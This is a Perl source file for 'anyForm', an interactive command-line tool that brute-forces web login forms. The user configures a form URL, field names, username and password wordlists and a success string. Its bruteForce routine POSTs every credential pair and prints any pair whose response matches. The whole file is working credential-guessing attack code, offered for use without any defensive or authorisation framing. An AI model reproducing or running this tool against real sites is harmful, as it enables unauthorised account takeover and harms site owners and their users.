#!/usr/bin/perl
#########################################################
#                    ______                   	       	#
#                    |  ___|                  	       	#
#    __ _ _ __  _   _| |_ ___  _ __ _ __ ___           	#
#   / _` | '_ \| | | |  _/ _ \| '__| '_ ` _ \          	#
#  | (_| | | | | |_| | || (_) | |  | | | | | |         	#
#   \__,_|_| |_|\__, \_| \___/|_|  |_| |_| |_|         	#
#                __/ |                                 	#
#               |___/                                  	#
#                                __   _____		#
#                               /  | |  _  |           	#
#                        __   __`| | | |/' |           	#
#                        \ \ / / | | |  /| | 	       	#
#                         \ V / _| |_\ |_/ /           	#
#                          \_/  \___(_)___/            	#
#                                                      	#
#                             				#
# Coded by: yak0d3       				#
# Github: https://github.com/yak0d3/anyForm            	#
# Version: 1.0   			    		#
# License: MIT						#
#########################################################
use Data::Dumper qw(Dumper);
use LWP::UserAgent;
use if $^O eq "MSWin32", Win32::Console::ANSI;
use Term::ANSIColor;
use Text::ANSITable;
use Text::ANSITable::BorderStyle::Default;
use Text::ANSITable::BorderStyle::Extra;
use Text::ANSITable::ColorTheme::Demo;
use String::Util 'trim';
use utf8;

#Configuration

$formUrl = '';
$opt     = '';
$elems   = 0;
$config  = 0;

#$output = '';
$_usrsList = '';
$_pwsList  = '';

#$_thds = 1;
$_userField = '';
$_passField = '';
$ssMsgfile  = '';
$successMsg = '';
@users      = ();
@passwords  = ();

#@elements = ();

if ( $^O =~ /MSWin32/ ) { system('mode con cols=200 lines=50'); system("cls"); }
else { print "\e[8;30;110t"; system("clear"); }    #Resize & clear window

anyForm();

print color('bold white'),
  "Type `help` for help screen and `start` to start bruteforcing.\n";
print color('bold cyan'), "\nanyForm> ";
print color('bold white');
$cmd = <STDIN>;
chomp($cmd);

while ( commands() eq 0 ) {

    print color('bold cyan'), "\nanyForm>$opt ";
    print color('bold white');
    $cmd = <STDIN>;
    chomp($cmd);
}

sub commands {
    my @options = split / /, $cmd;
    $opt_count = @options;
    if ( $cmd eq "clear" ) {
        if   ( $^O =~ /MSWin32/ ) { system("cls"); }
        else                      { system("clear"); }
        return 0;
    }
    elsif ( $cmd eq "exit" ) {
        anyForm();

        print "\nBye!\n";

        exit;

        return 1;

    }
    elsif ( $cmd eq "help" ) {

        helpMsg();
        return 0;

    }

    #elsif($cmd eq "elements") #This will be added in later versions.
    #{
    #	$opt = "elements>";
    #	$elems = 1;
    #	return 0;
    #}
    #elsif($elems eq 1 and $cmd eq "new") #This will be added in later versions.
    #{
    #	print "Enter element name(as in the html source code): ";
    #	$el = <STDIN>;
    #	chomp($el);
    #	push @elements, $el;

    #	print "[+]Success: Element `$el` has been successfully added.\n";
    #	$elems = 0;
    #	return 0;

    #}
    elsif ( $opt_count eq 3 and @options[0] eq 'set' ) {
        if ( 1 == 1 )  #This will be updated to `config eq 1` in later versions.
        {
            if ( @options[1] eq 'url' ) {
                $formUrl = @options[2];
                chomp($formUrl);
                print color('bright_green'), '[SUCCESS]';
                print "Form url has been successfully set to `$formUrl`\n";
                $cmd = "";
                return 0;
            }

            #elsif(@options[1] eq 'output')
            #{
            #	$output = @options[2];
            #	print "[SUCCESS]Output ==> $output\n";
            #	$cmd = "";
            #	return 0;
            #}
            elsif ( @options[1] eq 'users' ) {
                $_usrsList = @options[2];
                if ( !-e $_usrsList )    #Check file existence
                {
                    $_usrsList = '';
                    print color('bold bright_red'), "[ERROR]";
                    print "File doesn't exist.\n";
                    return 0;
                }
                splice(@users);
                open my $in, "<", $_usrsList or die "$_usrsList: $!";
                while ( my $line = <$in> ) {

                    #chomp($line);
                    push @users, $line;
                }
                close $in;
                print color('bright_green'), '[SUCCESS]';
                print "Users List ==> $_usrsList \n";
                return 0;
            }
            elsif ( @options[1] eq 'passwords' ) {
                $_pwsList = @options[2];
                if ( !-e $_pwsList ) {
                    $_pwsList = '';
                    print color('bold bright_red'), "[ERROR]";
                    print "File doesn't exist.\n";    #Check file existence
                    return 0;
                }
                splice(@passwords);
                open my $in, "<", $_pwsList or die "$_pwsList: $!";
                while ( my $line = <$in> ) {

                    #chomp($line);
                    push @passwords, $line;
                }
                print color('bright_green'), '[SUCCESS]';
                print "Passwords List ==> $_pwsList \n";

                return 0;
            }
            elsif ( @options[1] eq 'userField' ) {
                $_userField = @options[2];
                print color('bright_green'), '[SUCCESS]';
                print "userField List ==> $_userField \n";

                return 0;
            }
            elsif ( @options[1] eq 'passField' ) {
                $_passField = @options[2];
                print color('bright_green'), '[SUCCESS]';
                print "passField ==> $_passField \n";

                return 0;
            }
            elsif ( @options[1] eq 'ssMsg' ) {
                $ssMsgfile = @options[2];
                if ( !-e $_pwsList ) {
                    $successMsg = '';
                    print color('bold bright_red'), "[ERROR]";
                    print "File doesn't exist.\n";    #Check file existence
                    return 0;
                }
                open my $fh, '<', $ssMsgfile or die "Can't open file $!";
                $successMsg = do { local $/; <$fh> };
                print color('bright_green'), '[SUCCESS]';
                print "Success message has been successfully updated. \n";

                return 0;
            }

            #elsif (@options[1] eq "threads") {
            #   if(@options[2] < 1)
            #  {
            #	   print "[ERROR]You need to enter a positive value.\n";
            #	   return 0;
            #  }
            #  $_thds = @options[2];
            #  print "\n[SUCCESS]Threads List ==> $_usrsList \n";
            #  return 0;
            #}
            else {
                print color('bold bright_red'), "\n[ERROR]";
                print "Unknown command.\n";
                return 0;
            }
        }
        else {
            print color('bold bright_red'), "\n[ERROR]";
            print "Unknown command.\n";
            return 0;
        }
    }
    elsif ( $cmd eq 'start' ) {
        if (   $formUrl eq ''
            or $_usrsList eq ''
            or $_pwsList eq ''
            or $_userField eq ''
            or $_passField eq ''
            or $successMsg eq '' )
        {
            print color('bold bright_red'), "[ERROR]";
            print
"Please check your configuration.\nType `config` to see the current values.\n";
            return 0;
        }
        else {
            print "Starting bruteforce...\n";
            bruteForce();
            return 0;
        }
    }
    elsif ( $cmd eq 'config' ) {
        config();
        return 0;
    }

#elsif($cmd eq "config") # I have thought about this twice, and i think i will add it in later versions.
#{
#	$opt = "config>";
#	$config = 1;

    #	return 0;
    #}
    else {
        print "Unknown command.\n";
        return 0;

    }
}

#sub saveSuccess
#{
#	my out = shift;
#	my data = shift;

#}
sub anyForm {
    print color('bold bright_green'), "
      db                         `7MM\"\"\"YMM                                  
     ;MM:                          MM    `7                                  
    ,V^MM.    `7MMpMMMb.`7M'   `MF'MM   d  ,pW\"Wq.`7Mb,od8 `7MMpMMMb.pMMMb.  
   ,M  `MM      MM    MM  VA   ,V  MM\"\"MM 6W'   `Wb MM' \"'   MM    MM    MM  
   AbmmmqMA     MM    MM   VA ,V   MM   Y 8M     M8 MM       MM    MM    MM  
  A'     VML    MM    MM    VVV    MM     YA.   ,A9 MM       MM    MM    MM  
.AMA.   .AMMA..JMML  JMML.  ,V   .JMML.    `Ybmd9'.JMML.   .JMML  JMML  JMML.
                           ,V                                                
                        OOb\"                                                 
					8b           d8    88       ,a8888a,     
					`8b         d8'  ,d88     ,8P\"'  `\"Y8,   
					 `8b       d8' 888888    ,8P        Y8,  
					  `8b     d8'      88    88          88  
					   `8b   d8'       88    88          88  
					    `8b d8'        88    `8b        d8'  
					     `888'         88 888 `8ba,  ,ad8'   
					      `8'          88 888   \"Y8888P\" ";
    print color('bold bright_blue'), "

			    	[+]Coded by yak0d3[+]
			|Github: https://github.com/yak0d3/anyForm
			|Version:1.0
			|License: MIT (You have to address my name in any redistributed copy)
\n\n
";

}

sub config {

    my $t = Text::ANSITable->new;
    $t->use_utf8(0);

    $t->columns( [ "Option", "Value" ] );
    $t->add_row( [ "url",       $formUrl ] );
    $t->add_row( [ "users",     $_usrsList ] );
    $t->add_row( [ "paswords",  $_pwsList ] );
    $t->add_row( [ "userField", $_userField ] );
    $t->add_row( [ "passField", $_passField ] );
    $t->add_row( [ "ssMsg",     $ssMsgfile ] );
    print $t->draw;

}

sub helpMsg {

    binmode( STDOUT, ":utf8" );

    my $t = Text::ANSITable->new;
    $t->use_utf8(1);
    $t->border_style('Extra::dash3');
    $t->color_theme('Demo::demo_random_border_color');

    $t->columns( [ "Command", "Action", "Example" ] );
    $t->add_row(
        [
            "set url <value>",
            "Setting the form url to a new value",
            "set url http://www.example.com/form1.php"
        ]
    );
    $t->add_row(
        [
            "set users <value>",
            "Give users list a new value",
            "set users users_list.txt"
        ]
    );
    $t->add_row(
        [
            "set passwords <value>",
            "Give passwords list a new value",
            "set passwords passwords_list.txt"
        ]
    );
    $t->add_row(
        [
            "set userField <value>",
            "Enter the value of the user field (as in the html source)",
            "set userField username"
        ]
    );
    $t->add_row(
        [
            "set passField <value>",
            "Enter the value of the password field (as in the html source)",
            "set userField password"
        ]
    );
    $t->add_row(
        [
            "set ssMsg <value>",
            "Setting the success string to test on",
            "set ssMsg success.txt"
        ]
    );
    $t->add_row( [ "start", "Start bruteforcing",     "" ] );
    $t->add_row( [ "help",  "Show this help message", "" ] );
    print $t->draw;

}

sub bruteForce {
    my $stop = 0;

    foreach $user (@users) {
        $user = trim($user);
        last if ( $stop == 1 );

        foreach $pass (@passwords) {

            $pass = trim($pass);
            last if ( $stop == 1 );

            my $ua       = LWP::UserAgent->new();
            my $response = $ua->post( $formUrl,
                [ "$_userField" => "$user", "$_passField" => "$pass" ] );
            my $content = $response->as_string();
            if ( index( $content, $successMsg ) != -1 ) {

                print color('bold yellow'), "   [";
                print color('bold green'),  'SUCCESS';
                print color('bold yellow'), ']';

                print color('bold white');
                print "$formUrl ==> $user:$pass\n";
                $stop = 1;
            }
            else {

                print color('bold yellow'), "[";
                print color('bold red'),    'FAILURE';
                print color('bold yellow'), ']';

                print color('bold white');
                print "$formUrl ==> $user:$pass\n";

            }

        }

    }

}
